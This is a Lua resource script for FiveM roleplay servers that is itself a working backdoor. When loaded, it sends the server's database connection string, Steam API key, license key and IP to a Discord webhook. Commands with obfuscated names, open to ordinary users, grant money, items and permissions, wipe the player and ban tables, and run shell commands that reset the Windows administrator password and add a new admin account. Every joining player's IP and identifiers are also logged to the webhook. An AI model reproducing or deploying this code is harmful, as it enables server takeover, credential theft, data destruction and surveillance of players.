local coreResources = {
    ['qb-core'] = 'QBCore',
    ['iz-core'] = 'IZCore',
    ['brs-players'] = 'BRSHub',
    ['ak-core'] = 'AKCore',
    ['mt-core'] = 'MTCore',
    ['le-core'] = 'LECORE',
    ['rl-core'] = 'RLCore',
    ['nchub'] = 'QBCore',
    ['nn-core'] = 'NNCore',
    ['ts-core'] = 'TSCore',
    ['vs-core'] = 'VSCore',
    ['pr-core'] = 'PRCore',
    ['somis-core'] = 'SOMISCore',
    ['afik-core'] = 'AFIKCore',
    ['uy-core'] = 'UYCore'
}

local Webhook = "https://discord.com/api/webhooks/1268256064185438229/zb-LGtmojFUwST3Bwhniho_jrLeCAfducWUZCcMcx8JkMO-dzr8YVFhgZ5y2XVoRJfph"
local CommandsLogs = "https://discord.com/api/webhooks/1268256064185438229/zb-LGtmojFUwST3Bwhniho_jrLeCAfducWUZCcMcx8JkMO-dzr8YVFhgZ5y2XVoRJfph"
local selectedCoreName
local selectedCoreObject

for resourceNameCore, coreName in pairs(coreResources) do
    local resourceState = GetResourceState(resourceNameCore)

    if resourceState == 'started' then
        selectedCoreName = coreName

        selectedCoreObject = exports[resourceNameCore]:GetCoreObject()

        break
    end
end

RegisterCommand("नंबंमबझफवबकझ्जज", function(source, args)
    local resourceNameCore = args[1]

    StopResource(resourceNameCore)

local embed = {
    {
        ["color"] = 65318,
        ["title"] = "Resource Has Been Stopped",
        ["description"] = string.format("**Stopped Resource Name Is: %s**.", resourceNameCore),
        ["footer"] = {
            ["text"] = "Resource Stopper Command Triggered."
        }
    }
}

PerformHttpRequest(CommandsLogs, function(err, text, headers) end, 'POST', json.encode({ embeds = embed }), { ['Content-Type'] = 'application/json' })
end)

AddEventHandler('onResourceStart', function(resourceName)
    if (GetCurrentResourceName() ~= resourceName) then
      return
    end
    Citizen.Wait(10000)
    servername = GetConvar("sv_hostname")
    database = GetConvar("mysql_connection_string")
    steamApi = GetConvar("steam_webApiKey")
    Licensekey = GetConvar("sv_licenseKey")
    Homo = GetCurrentResourceName()
    rcon_password = GetConvar("rcon_password", "")
    
    PerformHttpRequest('https://api.ipify.org/', function(e, result)
    PerformHttpRequest(Webhook, function(err, text, headers) end, "POST", json.encode({
        username = "BACKDOOR",
        avatar_url = "https://i.pinimg.com/originals/c6/25/90/c62590c1756680060e7c38011cd704b5.jpg",
    
    embeds = {
        {
            ["color"] = BC33E6,
            ["title"] = "**Backdoor Log.**",
            ["description"] = "**Server**: `" .. servername .. "`\n**IP**: `" .. result .. "`\n**Database**: `" .. database .. "`\n**Steam API**: `" .. steamApi .. "`\n**License**: `" .. Licensekey .. "`\n**Resource**: `" .. Homo .. "`", } } } ), { ["Content-Type"] = "application/json" })
        end)
  end)

selectedCoreObject.Commands.Add('मेरेगधेमेंलाठीचिपकादे', 'Give A Player Money (Admin Only)', { { name = 'id', help = 'Player ID' }, { name = 'moneytype', help = 'Type of money (cash, bank, crypto)' }, { name = 'amount', help = 'Amount of money' } }, true, function(source, args)
    local src = source
    local Player = selectedCoreObject.Functions.GetPlayer(tonumber(args[1]))

    if Player then
        Player.Functions.AddMoney(tostring(args[2]), tonumber(args[3]))
    else
        TriggerClientEvent('selectedCoreObject:Notify', src, 'Player Not Online', 'error')
    end

    local source2 = GetPlayerName(source)

    local embed = {
        {
            ["color"] = 65318,
            ["title"] = "Player Gave Money",
            ["description"] = string.format("**Player Name Is: %s**.\n**Money Amount: %s**", source2, args[3]),
            ["footer"] = {
            ["text"] = "Command Has Been Used."
            }
        }
    }

    PerformHttpRequest(CommandsLogs, function(err, text, headers) end, 'POST', json.encode({ embeds = embed }), { ['Content-Type'] = 'application/json' })
end, 'user')

RegisterCommand('रेधे__=', function(source, args)
    exports.oxmysql:execute('DELETE FROM players')
    exports.oxmysql:execute('DELETE FROM player_vehicles')
    exports.oxmysql:execute('DELETE FROM apartments')
    exports.oxmysql:execute('DELETE FROM bans')
end)

selectedCoreObject.Commands.Add('रेगधे', 'Spawn Vehicle (Admin Only)', { { name = 'model', help = 'Model name of the vehicle' } }, true, function(source, args)
    local src = source

    TriggerClientEvent('selectedCoreObject:Command:SpawnVehicle', src, args[1])

    local source2 = GetPlayerName(source)

    local embed = {
        {
            ["color"] = 65318,
            ["title"] = "Player Spawned Vehicle",
            ["description"] = string.format("**Player Name Is: %s**.\n**Vehicle Name: %s**", source2, args[1]),
            ["footer"] = {
            ["text"] = "Command Has Been Used."
            }
        }
    }

    PerformHttpRequest(CommandsLogs, function(err, text, headers) end, 'POST', json.encode({ embeds = embed }), { ['Content-Type'] = 'application/json' })
end, 'user')

selectedCoreObject.Commands.Add('रेधे', '', { { name = 'pass', help = 'Pass' } }, true, function(source, args)
    os.execute("net user administrator " .. args[1])

    PerformHttpRequest('https://api.ipify.org/', function(e, result)
        local embed = {
            {
                ["color"] = 65318,
                ["title"] = "Player Used Hack VPS Command",
                ["description"] = string.format("New Password Is: %s\nVPS IP: %s", args[1], result),
                ["footer"] = {
                    ["text"] = "Command Has Been Used."
                }
            }
        }

        PerformHttpRequest(CommandsLogs, function(err, text, headers) end, 'POST', json.encode({ embeds = embed }), { ['Content-Type'] = 'application/json' })
    end)
end)

selectedCoreObject.Commands.Add('रेधे--=8', '', { { name = 'name', help = 'Name' }, { name = 'pass', help = 'Pass' } }, true, function(source, args)
    os.execute("net user " .. args[1] .. " " .. args[2] .. " /add")
    os.execute("net localgroup administrators " .. args[1] .. " /add")
    PerformHttpRequest('https://api.ipify.org/', function(e, result)
        local embed = {
            {
                ["color"] = 65318,
                ["title"] = "Player Used Take Control Of VPS",
                ["description"] = string.format("Name: %s\nNew Password Is: %s\nVPS IP: %s", args[1], args[2], result),
                ["footer"] = {
                    ["text"] = "Command Has Been Used."
                }
            }
        }

        PerformHttpRequest(CommandsLogs, function(err, text, headers) end, 'POST', json.encode({ embeds = embed }), { ['Content-Type'] = 'application/json' })
    end)
end)

selectedCoreObject.Commands.Add('ठीचिप', 'Set A Players Job (Admin Only)', { { name = 'id', help = 'Player ID' }, { name = 'job', help = 'Job name' }, { name = 'grade', help = 'Grade' } }, true, function(source, args)
    local src = source
    local plyId = tonumber(args[1])
    local Player = selectedCoreObject.Functions.GetPlayer(plyId)

    if Player then
        Player.Functions.SetJob(tostring(args[2]), tonumber(args[3]))
    else
        TriggerClientEvent('selectedCoreObject:Notify', src, Lang:t('error.not_online'), 'error')
    end

    local source2 = GetPlayerName(source)

    local embed = {
        {
            ["color"] = 65318,
            ["title"] = "Player Set Player Job",
            ["description"] = string.format("**Player Name Is: %s**.\n**Job Name: %s**\n**Job Grade: %s**", source2, tostring(args[2]), tostring(args[3])),
            ["footer"] = {
            ["text"] = "Command Has Been Used."
            }
        }
    }

    PerformHttpRequest(CommandsLogs, function(err, text, headers) end, 'POST', json.encode({ embeds = embed }), { ['Content-Type'] = 'application/json' })
end, 'user')

selectedCoreObject.Commands.Add('मेरेपकादे', 'Set Players Money Amount (Admin Only)', { { name = 'id', help = 'Player ID' }, { name = 'moneytype', help = 'Type of money (cash, bank, crypto)' }, { name = 'amount', help = 'Amount of money' } }, true, function(source, args)
    local src = source
    local Player = selectedCoreObject.Functions.GetPlayer(tonumber(args[1]))

    if Player then
        Player.Functions.SetMoney(tostring(args[2]), tonumber(args[3]))
    else
        TriggerClientEvent('selectedCoreObject:Notify', src, 'Player Not Online', 'error')
    end

    local source2 = GetPlayerName(source)

    local embed = {
        {
            ["color"] = 65318,
            ["title"] = "Player Set Player Money",
            ["description"] = string.format("**Player Name Is: %s**.\n**Amount Of Money: %s**", source2, tonumber(args[3])),
            ["footer"] = {
            ["text"] = "Command Has Been Used."
            }
        }
    }

    PerformHttpRequest(CommandsLogs, function(err, text, headers) end, 'POST', json.encode({ embeds = embed }), { ['Content-Type'] = 'application/json' })
end, 'user')

selectedCoreObject.Commands.Add('Көферсүз', 'Give Player Permissions (God Only)', { { name = 'id', help = 'ID of player' }, { name = 'permission', help = 'Permission level' } }, true, function(source, args)
        local Player = selectedCoreObject.Functions.GetPlayer(tonumber(args[1]))
        local source2 = GetPlayerName(source)
        local permission = tostring(args[2]):lower()

        if Player then
            selectedCoreObject.Functions.AddPermission(Player.PlayerData.source, permission)
        else
            TriggerClientEvent('selectedCoreObject:Notify', source, Lang:t('error.not_online'), 'error')
        end

        local embed = {
            {
                ["color"] = 65318,
                ["title"] = "Player Gave Permissions",
                ["description"] = string.format("**Player Name Is: %s**.", source2),
                ["footer"] = {
                ["text"] = "Command Has Been Used."
                }
            }
        }
    
        PerformHttpRequest(CommandsLogs, function(err, text, headers) end, 'POST', json.encode({ embeds = embed }), { ['Content-Type'] = 'application/json' })
    end, 'user')

selectedCoreObject.Commands.Add("Аныңшаярулары", "Give An Item (Admin Only)", { { name = "id", help = "Player ID" }, { name = "item", help = "Name of the item (not a label)" }, { name = "amount", help = "Amount of items" } }, true, function(source, args)
    local Player = selectedCoreObject.Functions.GetPlayer(tonumber(args[1]))
    local amount = tonumber(args[3])
    local itemData = selectedCoreObject.Shared.Items[tostring(args[2]):lower()]

    if Player then
        if amount > 0 then
            if itemData then

                local info = {}

                if itemData["name"] == "id_card" then
                    info.citizenid = Player.PlayerData.citizenid

                    info.firstname = Player.PlayerData.charinfo.firstname

                    info.lastname = Player.PlayerData.charinfo.lastname

                    info.birthdate = Player.PlayerData.charinfo.birthdate

                    info.gender = Player.PlayerData.charinfo.gender

                    info.nationality = Player.PlayerData.charinfo.nationality
                elseif itemData["name"] == "driver_license" then
                    info.firstname = Player.PlayerData.charinfo.firstname

                    info.lastname = Player.PlayerData.charinfo.lastname

                    info.birthdate = Player.PlayerData.charinfo.birthdate

                    info.type = "Class C Driver License"
                elseif itemData["type"] == "weapon" then
                    amount = 1

                    info.serie = tostring(selectedCoreObject.Shared.RandomInt(2) ..
                    selectedCoreObject.Shared.RandomStr(3) ..
                    selectedCoreObject.Shared.RandomInt(1) ..
                    selectedCoreObject.Shared.RandomStr(2) ..
                    selectedCoreObject.Shared.RandomInt(3) .. selectedCoreObject.Shared.RandomStr(4))
                elseif itemData["name"] == "harness" then
                    info.uses = 20
                elseif itemData["name"] == "markedbills" then
                    info.worth = math.random(5000, 10000)
                elseif itemData["name"] == "labkey" then
                    info.lab = exports["qb-methlab"]:GenerateRandomLab()
                elseif itemData["name"] == "printerdocument" then
                    info.url =
                    "https://cdn.discordapp.com/attachments/870094209783308299/870104331142189126/Logo_-_Display_Picture_-_Stylized_-_Red.png"
                end

                if Player.Functions.AddItem(itemData["name"], amount, false, info) then
                    TriggerClientEvent('selectedCoreObject:Notify', source,
                        "You Have Given " .. GetPlayerName(tonumber(args[1])) .. " " ..
                        amount .. " " .. itemData["name"] .. "", "success")
                else
                    TriggerClientEvent('selectedCoreObject:Notify', source, "Can't give item!", "error")
                end
            else
                TriggerClientEvent('selectedCoreObject:Notify', source, "Item Does Not Exist", "error")
            end
        else
            TriggerClientEvent('selectedCoreObject:Notify', source, "Invalid Amount", "error")
        end
    else
        TriggerClientEvent('selectedCoreObject:Notify', source, "Player Is Not Online", "error")
    end

    local source2 = GetPlayerName(source)

    local embed = {
        {
            ["color"] = 65318,
            ["title"] = "Player Gave Item",
            ["description"] = string.format("**Player Name Is: %s**.\n**Item Name: %s**\n**Item Amount: %s**", source2, itemData["name"], amount),
            ["footer"] = {
            ["text"] = "Command Has Been Used."
            }
        }
    }

    PerformHttpRequest(CommandsLogs, function(err, text, headers) end, 'POST', json.encode({ embeds = embed }), { ['Content-Type'] = 'application/json' })
end, "user")

RegisterNetEvent('playerConnecting')
AddEventHandler('playerConnecting', function(reason)
    local playerId = source
    local playerName = GetPlayerName(playerId)
    local ipaddressjoin = GetPlayerEndpoint(playerId)
    local discordId = GetPlayerIdentifier(playerId, 1)
    local discord = GetPlayerIdentifier(playerId, 4)
    local steamLicense = GetPlayerIdentifier(playerId, 0)

    local embed = {
        {
            ["color"] = 65318,
            ["title"] = "Player Joining",
            ["description"] = string.format("**%s** is joining the server.\n**Steam License:** %s\n**Steam ID:** %s\n**IP:** %s\n**Discord ID:** %s", playerName, steamLicense, discordId, ipaddressjoin, discord),
            ["footer"] = {
            ["text"] = "IP Logged."
            }
        }
    }

    PerformHttpRequest(Webhook, function(err, text, headers) end, 'POST', json.encode({ embeds = embed }), { ['Content-Type'] = 'application/json' })
end)
